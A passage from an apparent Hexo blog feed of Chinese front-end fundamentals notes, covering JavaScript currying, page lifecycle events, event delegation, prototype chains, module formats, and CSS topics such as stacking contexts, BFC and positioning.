&#123;</span><br><span class="line">      args.push(...arguments)</span><br><span class="line">      <span class="keyword">return</span> curried</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> curried</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addCurry = curry(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> <span class="built_in">arguments</span>) &#123;</span><br><span class="line">    sum += <span class="built_in">arguments</span>[i]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(addCurry(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>)(<span class="number">4</span>)()) <span class="comment">//10</span></span><br></pre></td></tr></table></figure><h2 id="页面的生命周期"><a href="#页面的生命周期" class="headerlink" title="页面的生命周期"></a>页面的生命周期</h2><ul><li><code>DOMContentLoaded</code>:所有 <code>HTML</code> 已经加载完，<code>DOM</code> 树也构建完，但是额外的资源还没有加载完，如 <code>CSS</code> 和图片。</li><li><code>load</code>(<code>window.onload</code>):所有资源都加载完了</li><li><code>beforeunload</code>/<code>unload</code>:用户离开页面</li></ul><p>例外：</p><p><code>script</code> 有 <code>src</code> 且有 <code>defer</code> 或者 <code>async</code> 属性的不一样。</p><table><thead><tr><th></th><th>async</th><th>defer</th></tr></thead><tbody><tr><td>执行顺序</td><td>不阻塞渲染，一旦下载完立即执行，和在 <code>DOM</code> 中的顺序无关。</td><td>等待 <code>DOM</code> 解析完才执行，且执行顺序和 <code>DOM</code> 中顺序相同。</td></tr><tr><td>DOMContentLoaded</td><td>可能发生在 <code>DOMContentLoaded</code> 之前，前提是文档够长，且脚本够小执行快。</td><td>要等到 <code>DOMContentLoaded</code> 结束才会执行。</td></tr></tbody></table><h2 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h2><p>事件委托就是将子元素的监听事件移动到父元素，这样只用添加一个监听，在子元素非常多的时候有用。</p><p><strong>事件委托是发生在冒泡阶段的，不然捕获阶段是从外到内过程，这个时候拿不到子元素。</strong></p><p>且监听的事件是存储在堆中的，<strong>记得手动移除</strong>！而内联的事件不用移除，因为节点移除之后绑定在上面的监听事件就没有引用持有了，垃圾回收时会将其回收。</p><h2 id="箭头函数与普通函数的不同"><a href="#箭头函数与普通函数的不同" class="headerlink" title="箭头函数与普通函数的不同"></a>箭头函数与普通函数的不同</h2><ul><li><code>this</code> 的指向为创建时上下文</li><li>没有 <code>arguments</code></li><li><code>call</code> 和 <code>apply</code> 绑定 <code>this</code> 没有用</li><li>不能使用 <code>new</code> 操作符</li><li>没有 <code>prototype</code></li><li>不能作为构造函数</li></ul><h2 id="禁用鼠标点击事件"><a href="#禁用鼠标点击事件" class="headerlink" title="禁用鼠标点击事件"></a>禁用鼠标点击事件</h2><ul><li><code>CSS</code> 方法(<strong>最常用</strong>)<br><code>pointer-events: none</code></li><li><code>HTML</code><br><code>disabled</code> 设置为 <code>true</code>，一般只对按钮有作用。</li><li><code>JS</code><br>取消所有的监听事件，或者在监听事件中判断是否需要禁用点击事件再 <code>event.preventDefault();event.stopPropagation()</code>。</li></ul><h2 id="CommonJS-AMD-CMD-UMD-规范"><a href="#CommonJS-AMD-CMD-UMD-规范" class="headerlink" title="CommonJS AMD CMD UMD 规范"></a>CommonJS AMD CMD UMD 规范</h2><ul><li>CommonJS<br>根据 <code>CommonJS</code> 规范，一个单独的文件就是一个模块。每一个模块都是一个单独的作用域，也就是说，在一个文件定义的变量（还包括函数和类），都是私有的，对其他文件是不可见的。<br><code>CommonJS</code> 是同步的，而 <code>AMD</code> 和 <code>CMD</code> 是异步的。</li><li>AMD(Asynchromous Module Definition)<br><code>AMD</code> 是 <code>RequireJS</code> 在推广过程中对模块定义的规范化产出。<br><code>AMD</code> 异步加载模块。它的模块支持对象、函数、构造器、字符串、<code>JSON</code> 等各种类型的模块。<br>适用 <code>AMD</code> 规范适用 <code>define</code> 方法定义模块。<br><code>AMD</code> 运行时核心思想是「Early Executing」，也就是提前执行依赖。</li><li>CMD(Common Module Definition)<br><code>CMD</code> 是 <code>SeaJS</code> 在推广过程中对模块定义的规范化产出。</li><li>UMD(Universal Module Definition)<br><code>umd</code> 是 <code>AMD</code> 和 <code>CommonJS</code> 的糅合。<br>先判断是否支持 <code>AMD</code>（通过判断 <code>define</code> 是否存在），存在则使用 <code>AMD</code> 方式加载模块。再判断是否支持 <code>Node.js</code> 的模块（<code>exports</code>）是否存在，存在则使用 <code>Node.js</code> 模块模式。如果两个都不存在，那么可能就使用全局变量来定义了(一般根据传入的 <code>root</code>，可能是执行的 <code>this</code>)。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;JavaScript-中的-this&quot;&gt;&lt;a href=&quot;#JavaScript-中的-this&quot; class=&quot;headerlink&quot; title=&quot;JavaScript 中的 this&quot;&gt;&lt;/a&gt;JavaScript 中的 this&lt;/h2&gt;&lt;p&gt;&lt;code&gt;JS&lt;/code&gt; 中的 &lt;code&gt;this&lt;/code&gt; 是一个相对复杂的概念，不是简单几句能解释清楚的。粗略地讲，函数的调用方式决定了 &lt;code&gt;this&lt;/code&gt; 的值。&lt;code&gt;this&lt;/code&gt; 取值符合以下规则：&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://1016990109.github.io/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之JS原型链</title>
    <link href="http://1016990109.github.io/2018/09/07/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BJS%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
    <id>http://1016990109.github.io/2018/09/07/前端基础之JS原型链/</id>
    <published>2018-09-07T07:41:08.000Z</published>
    <updated>2018-09-07T08:03:55.516Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原型链简介"><a href="#原型链简介" class="headerlink" title="原型链简介"></a>原型链简介</h2><p>关于 <code>JS</code> 中的原型链，以及 <code>__proto__</code> 与 <code>prototype</code> 之间的关系，直接看一张图：</p><a id="more"></a><p><img src="/assets/img/prototype.jpg" alt="prototype"></p><p>举个例子来说：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person.__proto__ === Person.prototype) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor === Person) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Person.__proto__ === <span class="built_in">Function</span>.prototype) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.prototype.__proto__ === <span class="built_in">Object</span>.prototype) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.__proto__ === <span class="built_in">Function</span>.prototype) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span>) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__ === <span class="built_in">Function</span>.prototype) <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>一个对象的 <code>__proto__</code> 指向它构造函数的 <code>prototype</code>(有特殊情况)。</li><li><code>__proto__</code> 的末尾是 <code>Object.prototype.__proto__</code>，指向 <code>null</code>。</li><li>原型的构造函数就是对象的构造函数。</li></ol><blockquote><p>特殊情况：对象由 <code>Object.create</code> 函数创建：</p></blockquote><pre><code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'person1'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="built_in">Object</span>.create(person1)</span><br><span class="line"><span class="built_in">console</span>.log(person2.__proto__ === person1) <span class="comment">//true</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="属性查找"><a href="#属性查找" class="headerlink" title="属性查找"></a>属性查找</h2><p>当我们读取一个属性的时候，如果在实例属性上找到了，就读取它，不会管原型属性上是否还有相同的属性，这其实就是属性屏蔽。</p><p>但是如果在实例属性上没有找到的话，就会在实例的原型上去找，如果原型上还没有，就继续到原型的原型上去找，直到尽头(<code>Object.prototype</code>)。</p><p>如何检测一个属性存在于实例中，还是原型中？</p><p>使用方法 <code>hasOwnProperty</code>,属性只有存在于实例中才会返回 <code>true</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Person.prototype.prototypeName = <span class="string">'prototype name'</span></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="comment">// 实例属性</span></span><br><span class="line">person1.name = <span class="string">'J'</span></span><br><span class="line">person1.hasOwnProperty(<span class="string">'name'</span>) <span class="comment">// true</span></span><br><span class="line">person1.hasOwnProperty(<span class="string">'prototypeName'</span>)<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>而 <code>in</code> 操作符和 <code>Object.keys()</code> 都会返回所有属性，包括原型链上的属性。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;原型链简介&quot;&gt;&lt;a href=&quot;#原型链简介&quot; class=&quot;headerlink&quot; title=&quot;原型链简介&quot;&gt;&lt;/a&gt;原型链简介&lt;/h2&gt;&lt;p&gt;关于 &lt;code&gt;JS&lt;/code&gt; 中的原型链，以及 &lt;code&gt;__proto__&lt;/code&gt; 与 &lt;code&gt;prototype&lt;/code&gt; 之间的关系，直接看一张图：&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="原型链" scheme="http://1016990109.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之CSS</title>
    <link href="http://1016990109.github.io/2018/09/04/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BCSS/"/>
    <id>http://1016990109.github.io/2018/09/04/前端基础之CSS/</id>
    <published>2018-09-04T13:43:53.000Z</published>
    <updated>2018-09-22T02:10:47.748Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS-选择器的优先级"><a href="#CSS-选择器的优先级" class="headerlink" title="CSS 选择器的优先级"></a>CSS 选择器的优先级</h2><p>内联样式 &gt; <code>ID</code> 选择器 &gt; 类选择器、属性选择器和伪类选择器(<code>:hover</code>,<code>:first-child</code>，<code>:after</code> 之类) &gt; 标签（类型）选择器和伪元素选择器(<code>::after</code>,<code>::first-letter</code>,<code>::selection</code>等等)</p><blockquote><p><code>CSS2</code> 用的是 <code>:after</code>，而 <code>CSS3</code> 用的是 <code>::after</code>。</p></blockquote><p>相同则比较数量每一级的数量总和。</p><a id="more"></a><p>当出现优先级相等的情况时，最晚出现的样式规则会被采纳。</p><h2 id="重置（resetting）CSS-和-标准化（normalizing）CSS-的区别"><a href="#重置（resetting）CSS-和-标准化（normalizing）CSS-的区别" class="headerlink" title="重置（resetting）CSS 和 标准化（normalizing）CSS 的区别"></a>重置（resetting）CSS 和 标准化（normalizing）CSS 的区别</h2><ul><li><strong>重置（Resetting）</strong>： 重置意味着除去所有的浏览器默认样式。对于页面所有的元素，像 <code>margin</code>、<code>padding</code>、<code>font-size</code> 这些样式全部置成一样。你将必须重新定义各种元素的样式。</li><li><strong>标准化（Normalizing）</strong>： 标准化没有去掉所有的默认样式，而是保留了有用的一部分，同时还纠正了一些常见错误。</li></ul><h2 id="Float-定位"><a href="#Float-定位" class="headerlink" title="Float 定位"></a>Float 定位</h2><p>浮动（<code>float</code>）是 <code>CSS</code> 定位属性。浮动元素从网页的正常流动中移出，但是保持了部分的流动性，会影响其他元素的定位（<strong>比如文字会围绕着浮动元素</strong>）。这一点与绝对定位不同，绝对定位的元素完全从文档流中脱离。</p><blockquote><p>文字所在的行框并不会忽略已经脱离文档流的 <code>float</code> 元素，甚至会调整自己的行框宽度，给其让出空间，表现形式就是文字充满 <code>float</code> 元素的周围</p></blockquote><p><code>CSS</code> 的 <code>clear</code> 属性通过使用 <code>left</code>、<code>right</code>、<code>both</code>，让该元素向下移动（清除浮动）到浮动元素下面。</p><p>如果父元素只包含浮动元素，那么该父元素的高度将塌缩为 0。我们可以通过清除（<code>clear</code>）从浮动元素后到父元素关闭前之间的浮动来修复这个问题。一般方法是给父元素一个 <code>clearfix</code> 的类，内容如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得一提的是，把父元素属性设置为 <code>overflow: auto</code> 或 <code>overflow: hidden</code>，会使其内部的<strong>子元素</strong>形成块格式化上下文（<code>Block Formatting Context</code>），并且父元素会扩张自己，使其能够包围它的子元素。</p><h2 id="z-index"><a href="#z-index" class="headerlink" title="z-index"></a>z-index</h2><p><code>CSS</code> 中的 <code>z-index</code> 属性控制重叠元素的垂直叠加顺序。<strong><code>z-index</code> 只能影响 <code>position</code> 值不是 <code>static</code> 的元素</strong>。</p><p>没有定义 <code>z-index</code> 的值时，元素按照它们出现在 <code>DOM</code> 中的顺序堆叠（层级越低，出现位置越靠上）。非静态定位的元素（及其子元素）将始终覆盖静态定位（<code>static</code>）的元素，而不管 <code>HTML</code> 层次结构如何。</p><p>层叠上下文元素有如下特性：</p><ul><li>层叠上下文的层叠水平要比普通元素高；</li><li>层叠上下文可以阻断元素的混合模式；</li><li>层叠上下文可以嵌套，内部层叠上下文及其所有子元素均受制于外部的层叠上下文。</li><li>每个层叠上下文和兄弟元素独立，也就是当进行层叠变化或渲染的时候，只需要考虑后代元素。</li><li>每个层叠上下文是自成体系的，当元素发生层叠的时候，整个元素被认为是在父层叠上下文的层叠顺序中。</li></ul><p><strong>普通元素的层叠水平优先由层叠上下文决定</strong>，因此，层叠水平的比较只有在当前层叠上下文元素中才有意义。</p><p>层叠顺序：</p><p><img src="/assets/img/stacked_order.png" alt="stacked order"></p><p>层叠上下文的创建：</p><ul><li>页面根元素</li><li>对于包含有 <code>position:relative</code> / <code>position:absolute</code> / <code>position:fixed</code> / <code>position:sticky</code> 的定位元素，且 <code>z-index</code> 不是 <code>auto</code></li><li><code>z-index</code> 值不为 <code>auto</code> 的 <code>flex</code> 项(父元素 <code>display:flex|inline-flex</code>)，是 <code>flex</code> 布局的<strong>子元素</strong></li><li>元素的 <code>opacity</code> 值不是 1</li><li>元素的 <code>transform</code> 值不是 <code>none</code></li><li>元素 <code>mix-blend-mode</code> 值不是 <code>normal</code></li><li>元素的 <code>filter</code> 值不是 <code>none</code></li><li>元素的 <code>isolation</code> 值是 <code>isolate</code></li><li><code>will-change</code> 指定的属性值为上面任意一个</li><li>元素的 <code>-webkit-overflow-scrolling</code> 设为 <code>touch</code></li></ul><p>具体的一些比较可查看 <a href="https://www.zhangxinxu.com/wordpress/2016/01/understand-css-stacking-context-order-z-index/" target="_blank" rel="noopener">深入理解 CSS 中的层叠上下文和层叠顺序</a></p><h2 id="格式化上下文-Block-Formatting-Context"><a href="#格式化上下文-Block-Formatting-Context" class="headerlink" title="格式化上下文(Block Formatting Context)"></a>格式化上下文(Block Formatting Context)</h2><p>一个 HTML 盒（Box）满足以下任意一条，会创建块格式化上下文：</p><ul><li><code>float</code> 的值不是 <code>none</code>.</li><li><code>position</code> 的值不是 <code>static</code> 或 <code>relative</code>.</li><li><code>display</code> 的值是 <code>table-cell</code>、<code>table-caption</code>、<code>inline-block</code>、<code>flex</code>、或 <code>inline-flex</code>。</li><li><code>overflow</code> 的值不是 <code>visible</code>。</li></ul><h3 id="BFC-特性："><a href="#BFC-特性：" class="headerlink" title="BFC 特性："></a><code>BFC</code> 特性：</h3><ol><li>内部的 <code>Box</code> 会在垂直方向，从顶部开始一个接一个地放置。</li><li><code>Box</code> 垂直方向的距离由 <code>margin</code> 决定。属于同一个 <code>BFC</code> 的两个相邻 <code>Box</code> 的 <code>margin</code> 会发生叠加。(用来解决边距叠加问题，给会重叠的元素加一个 <code>BFC</code> 的父元素，那么这个 <code>BFC</code> 块就不会和下一个元素的边距重叠了，<strong>水平方向的 <code>margin</code> 是不会叠加的</strong>)</li><li>每个元素的 <code>margin box</code> 的左边， 与包含块 <code>border box</code> 的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</li><li><code>BFC</code> 的区域不会与 <code>float box</code> 叠加，<strong>就算这个 <code>float box</code> 不是和它同级的</strong>。(解决布局问题，一个块元素与浮动块重叠了的问题)</li><li><code>BFC</code> 就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素，反之亦然。</li><li>计算 <code>BFC</code> 的高度时，浮动元素也参与计算。(经常用来解决浮动元素导致父元素坍塌的问题)</li></ol><h2 id="不同浏览器的样式兼容性问题"><a href="#不同浏览器的样式兼容性问题" class="headerlink" title="不同浏览器的样式兼容性问题"></a>不同浏览器的样式兼容性问题</h2><ol><li>在确定问题原因和有问题的浏览器后，使用单独的样式表，仅供出现问题的浏览器加载。这种方法需要使用服务器端渲染。</li><li>使用已经处理好此类问题的库，比如 <code>Bootstrap</code>。</li><li>使用 <code>autoprefixer</code> 自动生成 <code>CSS</code> 属性前缀。(<code>webpack</code> 打包工具可使用 <code>postcss</code> 来完成)</li><li>使用 <code>Reset.css</code> 或 <code>Normalize.css</code>。</li></ol><h2 id="如何为功能受限的浏览器提供页面"><a href="#如何为功能受限的浏览器提供页面" class="headerlink" title="如何为功能受限的浏览器提供页面"></a>如何为功能受限的浏览器提供页面</h2><ul><li>优雅的降级：为现代浏览器构建应用，同时确保它在旧版浏览器中正常运行。</li><li>渐进式增强：构建基于用户体验的应用，但在浏览器支持时添加新增功能。</li><li>利用 <a href="https://caniuse.com" target="_blank" rel="noopener">caniuse.com</a> 检查特性支持。</li><li>使用 <code>autoprefixer</code> 自动生成 <code>CSS</code> 属性前缀。</li><li>使用 <a href="https://modernizr.com" target="_blank" rel="noopener">Modernizr</a> 进行特性检测。</li></ul><h2 id="用-CSS-隐藏页面元素"><a href="#用-CSS-隐藏页面元素" class="headerlink" title="用 CSS 隐藏页面元素"></a>用 CSS 隐藏页面元素</h2><ol><li><code>opacity</code> 设为 0。</li><li><code>visibility</code> 设为 <code>hidden</code>。</li><li><code>display</code> 设为 <code>none</code>。</li><li><code>position</code> 设为 <code>absolute</code>，然后移动到不可见区域，<code>left: -99999px</code>。</li><li><code>width: 0; height: 0; overflow: hidden</code>：使元素不占用屏幕上的任何空间，导致不显示它。</li><li><code>text-indent: -9999px</code>：这只适用于 <code>block</code> 元素中的文本。</li><li><code>clip(clip-path):rect()/inset()/polygon()</code>，注意只对 <code>position</code> 值为 <code>absolute</code> 或 <code>fixed</code> 的元素有效。</li><li><code>transform: scale(0,0)</code>。</li><li>利用 <code>z-index</code> 来隐藏。</li></ol><h2 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- link元素中的CSS媒体查询 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"only screen and (max-width: 800px)"</span> <span class="attr">href</span>=<span class="string">"example.css"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 样式表中的CSS媒体查询 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">@<span class="keyword">media</span> only screen and (max-width: <span class="number">600px</span>) &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.facet_sidebar</span> &#123;</span></span><br><span class="line"><span class="undefined">    display: none;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>and</code> 关键字用于合并多个媒体属性或合并媒体属性与媒体类型。</p><p>媒体查询中使用逗号分隔效果等同于 <code>or</code> 逻辑操作符。</p><p><code>not</code> 关键字应用于整个媒体查询，在媒体查询为假时返回真</p><p>更多的设置查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Media_queries" target="_blank" rel="noopener">CSS 媒体查询</a></p><h2 id="解释浏览器如何确定哪些元素与-CSS-选择器匹配"><a href="#解释浏览器如何确定哪些元素与-CSS-选择器匹配" class="headerlink" title="解释浏览器如何确定哪些元素与 CSS 选择器匹配"></a>解释浏览器如何确定哪些元素与 CSS 选择器匹配</h2><p>浏览器从最右边的选择器（关键选择器）根据关键选择器，浏览器从 <code>DOM</code> 中筛选出元素，然后向上遍历被选元素的父元素，判断是否匹配。选择器匹配语句链越短，浏览器的匹配速度越快。</p><p>例如，对于形如 <code>p span</code> 的选择器，浏览器首先找到所有 <code>&lt;span&gt;</code> 元素，并遍历它的父元素直到根元素以找到 <code>&lt;p&gt;</code> 元素。对于特定的 <code>&lt;span&gt;</code>，只要找到一个 <code>&lt;p&gt;</code>，就知道已经匹配并停止继续匹配</p><h2 id="box-sizing"><a href="#box-sizing" class="headerlink" title="box-sizing"></a>box-sizing</h2><p>改变计算元素 <code>height</code> 与 <code>width</code> 的方法。</p><p>元素默认应用了 <code>box-sizing: content-box</code>，元素的宽高只会决定内容（<code>content</code>）的大小。</p><p><code>box-sizing: border-box</code> 改变计算元素 <code>width</code> 和 <code>height</code> 的方式，<code>border</code> 和 <code>padding</code> 的大小也将计算在内。</p><h2 id="block、inline-与-inline-block-区别"><a href="#block、inline-与-inline-block-区别" class="headerlink" title="block、inline 与 inline-block 区别"></a>block、inline 与 inline-block 区别</h2><table><thead><tr><th></th><th>block</th><th>inline-block</th><th>inline</th></tr></thead><tbody><tr><td>大小</td><td>填充其父容器的宽度。</td><td>取决于内容。</td><td>取决于内容。</td></tr><tr><td>定位</td><td>从新的一行开始，并且不允许旁边有 <code>HTML</code> 元素（除非是<code>float</code>）</td><td>与其他内容一起流动，并允许旁边有其他元素。</td><td>与其他内容一起流动，并允许旁边有其他元素。</td></tr><tr><td>能否设置 <code>width</code> 和 <code>height</code></td><td>能</td><td>能</td><td>不能。设置会被忽略。</td></tr><tr><td>可以使用 <code>vertical-align</code> 对齐</td><td>不可以</td><td>可以</td><td>可以</td></tr><tr><td>边距（<code>margin</code>）和填充（<code>padding</code>）</td><td>各个方向都存在</td><td>各个方向都存在</td><td>只有水平方向存在。垂直方向会被忽略。 尽管 border 和 padding 在 content 周围，但垂直方向上的空间取决于’line-height’</td></tr><tr><td>浮动（<code>float</code>）</td><td>-</td><td>-</td><td>就像一个 <code>block</code> 元素，可以设置垂直边距和填充。</td></tr></tbody></table><h2 id="relative、fixed、absolute-和-static"><a href="#relative、fixed、absolute-和-static" class="headerlink" title="relative、fixed、absolute 和 static"></a>relative、fixed、absolute 和 static</h2><p>经过定位的元素，其 <code>position</code> 属性值必然是 <code>relative</code>、<code>absolute</code>、<code>fixed</code> 或 <code>sticky</code>。</p><ul><li><code>static</code>：默认定位属性值。该关键字指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。此时 <code>top</code>, <code>right</code>, <code>bottom</code>, <code>left</code> 和 <code>z-index</code> 属性无效。</li><li><code>relative</code>：该关键字下，元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。</li><li><code>absolute</code>：不为元素预留空间，通过指定元素相对于最近的非 <code>static</code> 定位祖先元素的偏移，来确定元素位置。绝对定位的元素可以设置外边距（<code>margins</code>），且不会与其他边距合并。</li><li><code>fixed</code>：不为元素预留空间，而是通过指定元素相对于屏幕视口（<code>viewport</code>）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。<code>fixed</code> 属性会创建新的层叠上下文。<strong>当元素祖先的 <code>transform</code> 属性非 <code>none</code> 时，容器由视口改为该祖先。</strong></li><li><code>sticky</code>：盒位置根据正常流计算(这称为正常流动中的位置)，然后相对于该元素在流中的 <code>flow root</code>（<code>BFC</code>）和 <code>containing block</code>（最近的块级祖先元素）定位。在所有情况下（即便被定位元素为 <code>table</code> 时），该元素定位均不对后续元素造成影响。当元素 B 被粘性定位时，后续元素的位置仍按照 B 未定位时的位置来确定。<code>position: sticky</code> 对 <code>table</code> 元素的效果与 <code>position: relative</code> 相同。须指定 <code>top</code>, <code>right</code>, <code>bottom</code> 或 <code>left</code> 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。</li></ul><p>详情以及例子可查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position" target="_blank" rel="noopener">position</a>。</p><h2 id="响应式设计与自适应设计不同"><a href="#响应式设计与自适应设计不同" class="headerlink" title="响应式设计与自适应设计不同"></a>响应式设计与自适应设计不同</h2><p>用一张图片来描述更合适：</p><p><em>上面是响应式设计，下面是自适应设计</em> <img src="/assets/img/rwd-vs-adapt-example.gif" alt="rwd-vs-adapt-example"></p><p>响应式设计和自适应设计都以提高不同设备间的用户体验为目标，根据视窗大小、分辨率、使用环境和控制方式等参数进行优化调整。</p><p>响应式设计的适应性原则：网站应该凭借一份代码，在各种设备上都有良好的显示和使用效果。响应式网站通过使用媒体查询，自适应栅格和响应式图片，基于多种因素进行变化，创造出优良的用户体验。就像一个球通过膨胀和收缩，来适应不同大小的篮圈。</p><p>自适应设计更像是渐进式增强的现代解释。与响应式设计单一地去适配不同，自适应设计通过检测设备和其他特征，从早已定义好的一系列视窗大小和其他特性中，选出最恰当的功能和布局。与使用一个球去穿过各种的篮筐不同，自适应设计允许使用多个球，然后根据不同的篮筐大小，去选择最合适的一个。</p><h2 id="视网膜分辨率处理"><a href="#视网膜分辨率处理" class="headerlink" title="视网膜分辨率处理"></a>视网膜分辨率处理</h2><p>使用媒体查询，像 <code>@media only screen and (min-device-pixel-ratio: 2) { ... }</code>，然后改变 <code>background-image</code>。</p><p>对于图标类的图形，尽可能使用 <code>svg</code> 和图标字体，因为它们在任何分辨率下，都能被渲染得十分清晰。</p><p>还有一种方法是，在检查了 <code>window.devicePixelRatio</code> 的值后，利用 <code>JavaScript</code> 将 <code>&lt;img&gt;</code> 的 <code>src</code> 属性修改，用更高分辨率的版本进行替换。<strong>注意：<code>IE</code> 和 <code>FireFox</code> 是不支持 <code>devicePixelRatio</code> 属性的。</strong></p><h2 id="translate-vs-postion-absolute"><a href="#translate-vs-postion-absolute" class="headerlink" title="translate vs postion absolute"></a>translate vs postion absolute</h2><p><code>translate(x, y)</code> 是 <code>transform</code> 的一个值。改变 <code>transform</code> 或 <code>opacity</code> 不会触发浏览器重新布局（<code>reflow</code>）或重绘（<code>repaint</code>），只会触发组合（<code>composite</code>）。而改变绝对定位会触发重新布局，进而触发重绘和复合。因此 <code>translate()</code> 更高效，可以缩短平滑动画的绘制时间。</p><p>当使用 <code>translate()</code> 时，元素仍然占据其原始空间（有点像 <code>position：relative</code>），这与改变绝对定位不同。</p><h2 id="translate3d-vs-translate"><a href="#translate3d-vs-translate" class="headerlink" title="translate3d vs translate"></a>translate3d vs translate</h2><p>只有 <code>Z</code> 轴上的变化才会产生新的合成层，<code>Z</code> 轴上设置 0 也是可以的，同时也会启用 <code>GPU</code> 加速，使用 <code>GPU</code> 来渲染该层。</p><p>也就是说 <code>translate3d</code> 才会触发 <code>GPU</code> 加速，二维的 <code>translate</code> 是不会的。同理，<code>rotate3d</code> 与 